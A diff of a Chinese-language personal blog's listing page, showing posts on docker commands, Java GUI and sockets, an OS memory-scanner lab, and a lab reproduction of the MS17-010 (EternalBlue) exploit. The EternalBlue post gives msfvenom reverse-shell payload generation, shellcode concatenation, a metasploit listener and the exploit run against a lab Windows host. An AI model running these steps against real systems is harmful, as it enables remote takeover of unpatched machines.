@@ -1,148 +1,1461 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dawnyh's Blog</title><meta name="description"><meta name="author" content="Dawnyh"><meta name="copyright" content="Dawnyh"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google8f709d858055e94e.html"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Dawnyh's Blog"><meta name="twitter:description"><meta name="twitter:image" content="http://dawnyh99.github.io/img/avatar.png"><meta property="og:type" content="website"><meta property="og:title" content="Dawnyh's Blog"><meta property="og:url" content="http://dawnyh99.github.io/page/4/"><meta property="og:site_name" content="Dawnyh's Blog"><meta property="og:description"><meta property="og:image" content="http://dawnyh99.github.io/img/avatar.png"><meta property="article:published_time" content="2022-12-29T16:12:04.255Z"><meta property="article:modified_time" content="2022-12-29T16:12:04.255Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
-var t = Cookies.get("theme")
-if (autoChangeMode == '1'){
-  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
-  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
-  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+<!DOCTYPE html>
+<html>
 
-  if (t === undefined){
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport){
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour < 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-  }
-  } else if (t == 'light') activateLightMode()
-  else activateDarkMode()
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
-} else if (autoChangeMode == '2'){
-  now = new Date();
-  hour = now.getHours();
-  isNight = hour < 6 || hour >= 18
-  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode() 
-} else {
-  if ( t == 'dark' ) activateDarkMode()
-  else if ( t == 'light') activateLightMode()
-}
+    
+    <title>Dawnyh&#39;s Blog</title>
 
-function activateDarkMode(){
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
-  }
-}
-function activateLightMode(){
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
-  }
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://dawnyh99.github.io/page/4/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
-  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  bookmark: {
-    message_prev: '按',
-    message_next: '键将本页加入书签'
-  },
-  runtime_unit: '天',
-  runtime: true,
-  copyright: undefined,
-  ClickShowText: {"text":"富强,民主,文明,和谐,自由,平等,公正,法制,爱国,敬业,诚信,友善","fontSize":"15px"},
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  highlightShrink: 'false',
-  isFontAwesomeV5: false,
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isanchor: false
+    <meta name="description" content="Dawnyh&#39;s Blog">
+    <meta name="keywords" content="">
+
+    
+
+
+
+    <meta property="og:type" content="website"/>
+    <meta property="og:title" content=""/>
+    <meta property="og:description" content=""/>
+    <meta property="og:locale" content="zh-CN" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="http://dawnyh99.github.io/page/4/index.html" />
+    <meta property="og:site_name" content="Dawnyh" />
+    <meta property="article:publisher" content="" />
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@type": "WebPage",
+            "name": "",
+            "description": "",
+            "publisher": {
+                "@type": "Organization",
+                "name": "Dawnyh"
+            },
+        }
+    </script>
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1654266144177.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1654266144177.css">
+
+
+    <script>
+        window.isPost = false
+        window.aomori = {
+            
+            
+            
+        }
+        window.aomori_logo_typed_animated = false
+        window.aomori_search_algolia = false
+
+    </script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Dawnyh's Blog" type="application/atom+xml">
+</head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-inner">
+                
+                    <a class="header-type-title" href="/">Dawnyh&#39;s Blog</a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+            </div>
+            <div class="header-menu-social">
+                
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="index">
   
-}</script><script>var GLOBAL_CONFIG_SITE = { 
-  isPost: false,
-  isHome: true,
-  isSidebar: false  
-  }</script><noscript><style>
-#page-header {
-  opacity: 1
+    
+      <article
+id="post-工具/docker"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/07/20/%E5%B7%A5%E5%85%B7/docker/">docker 常用命令</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h1>镜像管理</h1>
+<h2 id="配置镜像仓库的国内加速地址"><a class="header-anchor" href="#配置镜像仓库的国内加速地址"></a>配置镜像仓库的国内加速地址</h2>
+<pre><code class="language-shell"># Ubuntu16.04+、Debian8+、CentOS7适用
+# 创建或修改daemon配置文件:/etc/docker/daemon.json,内容如下
+{
+  &quot;registry-mirrors&quot;: [&quot;https://&lt;个人ID&gt;.mirror.aliyuncs.com&quot;]
 }
-.justified-gallery img{
-  opacity: 1
+# 保存文件后，重启服务
+sudo systemctl daemon-reload
+sudo systemctl restart docker
+</code></pre>
+<h2 id="从云端镜像仓库获取新镜像"><a class="header-anchor" href="#从云端镜像仓库获取新镜像"></a>从云端镜像仓库获取新镜像</h2>
+<pre><code class="language-shell"># 安装最新版镜像
+docker pull &lt;镜像名&gt;
+
+# 指定镜像版本安装
+docker pull &lt;镜像名&gt;:&lt;镜像版本&gt;
+</code></pre>
+<h1>容器管理</h1>
+<h2 id="从镜像创建并运行一个新容器"><a class="header-anchor" href="#从镜像创建并运行一个新容器"></a>从镜像创建并运行一个新容器</h2>
+<pre><code class="language-shell"># 前台运行
+docker run &lt;镜像名&gt;
+
+# 后台运行
+docker run -d &lt;镜像名&gt;
+
+# 把容器的一个服务端口映射到宿主机上
+docker run -p &lt;宿主机端口&gt;:&lt;容器端口&gt; &lt;镜像名&gt;
+
+# 映射多个端口
+docker run -p &lt;宿主机端口1&gt;:&lt;容器端口1&gt; \
+			-p &lt;宿主机端口2&gt;:&lt;容器端口2&gt; \
+			-p &lt;宿主机端口3&gt;:&lt;容器端口3&gt; &lt;镜像名&gt;
+			
+# 指定容器名
+docker run --name &lt;容器名&gt; &lt;镜像名&gt;
+
+# 以交互模式运行,在容器内执行 /bin/bash 命令
+docker run -it &lt;镜像名&gt; /bin/bash
+</code></pre>
+<h2 id="管理已创建的容器"><a class="header-anchor" href="#管理已创建的容器"></a>管理已创建的容器</h2>
+<pre><code class="language-shell"># 列出运行中的容器,以下二者都可以
+docker container ls
+docker ps
+
+# 列出所有已创建的容器，包括停止运行的
+docker container ls -a
+docker ps -a
+
+# 启动 | 停止 | 重启 | 删除容器
+docker [ start | stop | restart | rm ] &lt;容器名或容器ID&gt;
+
+# 重命名容器
+docker rename &lt;原容器名&gt; &lt;新容器名&gt;
+
+# 交互模式在容器内执行 /bin/bash 命令
+docker run -it &lt;容器名或容器ID&gt; /bin/bash
+
+# 从宿主机拷贝文件或文件夹到容器
+docker cp &lt;宿主机中的文件路径&gt; &lt;容器名或容器ID&gt;:&lt;容器内文件路径&gt;
+
+# 从容器拷贝文件或文件夹到宿主机
+docker cp &lt;容器名或容器ID&gt;:&lt;容器内文件路径&gt; &lt;宿主机中的文件路径&gt;
+</code></pre>
+<h1>Docker Compose</h1>
+<p>使用 Docker Compose 可以很方便地定义和运行多容器应用程序，通过yml文件即可进行配置。</p>
+<pre><code class="language-shell"># 首先移动到docker-compose.yml配置文件所在目录
+cd &lt;docker-compose.yml所在目录&gt;
+
+# 前台运行应用程序
+docker-compose up
+
+# 后台运行应用程序
+docker-compose up -d
+
+# 停止应用程序
+docker-compose stop
+
+# 重新启动应用程序
+docker-compose restart
+
+# 删除停止运行的容器
+docker-compose rm
+
+# 停止运行应用程序并删除对应容器
+docker-compose down
+</code></pre>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-07-19T16:00:00.000Z" itemprop="datePublished">2020-07-20</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-漏洞/MS17-010漏洞复现"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">MS17-010漏洞复现</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
+<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
+<p>攻击机：Kali Linux	(192.168.233.128)</p>
+<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
+<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
+<p>关闭靶机防火墙</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
+<p>在window server 2012中启动Guest账号</p>
+<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
+<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
+<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
+<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
+<p>下载到kali后后使用NASM工具对asm代码编译</p>
+<pre><code>nasm -f bin eternalblue_kshellcode_x64.asm
+</code></pre>
+<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
+<pre><code>msfvenom -p windows/x64/shell/reverse_tcp -f raw -o reverse_shell.bin EXITFUNC=thread LHOST=192.168.233.128 LPORT=9090
+</code></pre>
+<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
+<pre><code>cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin
+</code></pre>
+<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/x64/shell/reverse_tcp
+set LHOST 192.168.233.128
+set LPORT 9090
+exploit
+</code></pre>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
+<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
+<p>保存退出，然后运行该脚本</p>
+<pre><code>python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500
+</code></pre>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
+<p>运行成功，此时返回msf命令行</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
+<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-07-17T16:00:00.000Z" itemprop="datePublished">2020-07-18</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-编程语言/Java/GUI编程"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/">Java-GUI编程</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
+<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
+<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
+<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
+<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
+<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
+<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-07-09T16:00:00.000Z" itemprop="datePublished">2020-07-10</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GUI/" rel="tag">GUI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-编程语言/Java/网络编程"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
+<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
+<pre><code class="language-java"> InetAddress类：
+
+ public static InetAddress getByName(String host) //根据域名获取ip
+     
+ public static InetAddress getLocalHost() //获取本地ip
+     
+ public String getHostAddress() //获得InetAddress对象的ip地址
+     
+ public String getHostName() //获得InetAddress对象的域名
+</code></pre>
+<pre><code class="language-java"> Socket类：
+
+ public Socket(InetAddress address, int port)
+     
+ public Socket(String host, int port)
+     
+ public Socket accept() //服务器端接收socket连接请求，创建socket对象
+ 
+ public InputStream getInputStream() //返回此套接字的输入流，用于接收网络消息
+
+ public OutputStream getOutputStream() //返回此套接字的输出流，用于发送网络消息
+ 
+ public InetAddress getInetAddress() //返回此套接字连接到的远程IP地址或null
+     
+ public InetAddress getLocalAddress() //获取套接字绑定的本地地址
+     
+ public int getPort() //返回此套接字连接到的远程端口号或0
+     
+ public int getLocalPort() //返回此套接字绑定到的本地端口或 -1
+     
+ public void close()
+</code></pre>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-07-07T16:00:00.000Z" itemprop="datePublished">2020-07-08</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-专业课/操作系统/操作系统实验——内存扫描器设计实现"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/">操作系统实验——内存扫描器设计实现</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="实验内容"><a class="header-anchor" href="#实验内容"></a>实验内容</h2>
+<p>(1) 能直接从当前操作系统（或Windows操作系统或Linux操作系统）内存获取内存存储数据；</p>
+<p>(2) 能对获取的数据进行分析，包括内存结构、进程链表、页目录表结构、进程相关信息等；</p>
+<p>(3) 设计物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</p>
+<p>(4) 设计物理内存数据修改功能，并展示内存数据修改后的结果；</p>
+<p>(5) 界面友好</p>
+<h2 id="总体设计"><a class="header-anchor" href="#总体设计"></a>总体设计</h2>
+<p>在本次实验中，我只实现了读取系统和内存信息，获取进程列表及进程相关信息，内存内容搜索，内存内容修改四个功能。每个功能分别由一个程序模块实现。程序开始运行时，调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再调用<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
+<h2 id="详细设计与实现"><a class="header-anchor" href="#详细设计与实现"></a>详细设计与实现</h2>
+<h3 id="数据结构设计"><a class="header-anchor" href="#数据结构设计"></a>数据结构设计</h3>
+<ol>
+<li>SYSTEM_INFO 系统信息结构体</li>
+</ol>
+<pre><code>typedef struct _SYSTEM_INFO {
+    __C89_NAMELESS union {
+      DWORD dwOemId;
+      __C89_NAMELESS struct {
+  WORD wProcessorArchitecture;
+  WORD wReserved;
+      } DUMMYSTRUCTNAME;
+    } DUMMYUNIONNAME;
+    DWORD dwPageSize;					//页面大小
+    LPVOID lpMinimumApplicationAddress;	//进程用户区起始地址
+    LPVOID lpMaximumApplicationAddress;	//进程用户区上界
+    DWORD_PTR dwActiveProcessorMask;
+    DWORD dwNumberOfProcessors;
+    DWORD dwProcessorType;
+    DWORD dwAllocationGranularity;
+    WORD wProcessorLevel;
+    WORD wProcessorRevision;
+  } SYSTEM_INFO;
+</code></pre>
+<ol start="2">
+<li>MEMORYSTATUS 内存信息结构体</li>
+</ol>
+<pre><code>typedef struct _MEMORYSTATUS {
+    DWORD dwLength;			//MEMORYSTATUS结构的大小
+    DWORD dwMemoryLoad;		//物理内存使用率
+    SIZE_T dwTotalPhys;		//总物理内存
+    SIZE_T dwAvailPhys;		//可用物理内存
+    SIZE_T dwTotalPageFile;	//总页面文件大小
+    SIZE_T dwAvailPageFile;	//可用页面文件大小
+    SIZE_T dwTotalVirtual;	//总虚拟内存
+    SIZE_T dwAvailVirtual;	//可用虚拟内存
+  } MEMORYSTATUS
+</code></pre>
+<ol start="3">
+<li>PROCESSENTRY32 进程快照信息结构体，用于获取正在运行的所有进程的信息</li>
+</ol>
+<pre><code>typedef struct tagPROCESSENTRY32
+{
+    DWORD dwSize;	//结构体大小
+    DWORD cntUsage;	
+    DWORD th32ProcessID;	//进程ID
+    ULONG_PTR th32DefaultHeapID;
+    DWORD th32ModuleID;
+    DWORD cntThreads;	//线程数
+    DWORD th32ParentProcessID;
+    LONG pcPriClassBase;
+    DWORD dwFlags;
+    TCHAR szExeFile[MAX_PATH];	//进程名称
+} PROCESSENTRY32;
+</code></pre>
+<ol start="4">
+<li>MEMORY_BASIC_INFORMATION32</li>
+</ol>
+<pre><code>typedef struct _MEMORY_BASIC_INFORMATION32 {
+      DWORD BaseAddress;	//指向页面区域基地址的指针
+      DWORD AllocationBase;//指向VirtualAlloc函数分配的页面范围的基地址的指针。BaseAddress成员指向的页面包含在此分配范围内。
+      DWORD AllocationProtect;//最初分配区域时的内存保护选项。该成员可以是内存保护常量之一，如果调用者没有访问权限，则该成员可以为 0。
+      DWORD RegionSize;//从所有页具有相同属性的基地址开始的区域大小
+      DWORD State;//区域中页面的状态，有MEM_COMMIT、MEM_FREE、MEM_RESERVE三种可能
+      DWORD Protect;//区域中页面的访问保护。该成员是为AllocationProtect成员列出的值之一。
+      DWORD Type;区域中页面的类型，有MEM_IMAGE、MEM_MAPPED、MEM_PRIVATE三种可能
+    } MEMORY_BASIC_INFORMATION32;
+</code></pre>
+<h3 id="getSystemInfo-模块的设计与实现"><a class="header-anchor" href="#getSystemInfo-模块的设计与实现"></a>getSystemInfo 模块的设计与实现</h3>
+<p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
+<h3 id="getProcessInfo-模块的设计与实现"><a class="header-anchor" href="#getProcessInfo-模块的设计与实现"></a>getProcessInfo 模块的设计与实现</h3>
+<p>首先调用<code>CreateToolhelp32Snapshot</code>函数获取进程列表快照的句柄，然后遍历进程快照，轮流显示每个进程的信息（PID、进程名、线程数等）。</p>
+<h3 id="getMemoryBlock-模块的设计与实现"><a class="header-anchor" href="#getMemoryBlock-模块的设计与实现"></a>getMemoryBlock 模块的设计与实现</h3>
+<p>调用<code>OpenProcess()</code>获取想要访问的进程的句柄，循环调用<code>VirtualQueryEx()</code>函数，将返回的<code>MEMORY_BASIC_INFORMATION</code>数据结构保存到列表中，循环遍历列表，打印各个内存块的基本信息。</p>
+<h3 id="SearchProcessMemory-模块的设计与实现"><a class="header-anchor" href="#SearchProcessMemory-模块的设计与实现"></a>SearchProcessMemory 模块的设计与实现</h3>
+<p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
+<h3 id="ModifyProcessMemory-模块的设计与实现"><a class="header-anchor" href="#ModifyProcessMemory-模块的设计与实现"></a>ModifyProcessMemory 模块的设计与实现</h3>
+<p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
+<h2 id="运行结果"><a class="header-anchor" href="#运行结果"></a>运行结果</h2>
+<p>程序运行界面如图</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
+<p>我们选择要打开的进程，以helloworld测试程序test.exe（PID为1500）为例（系统进程所需权限较高，会打开失败）：</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps4.jpg" alt="img"></p>
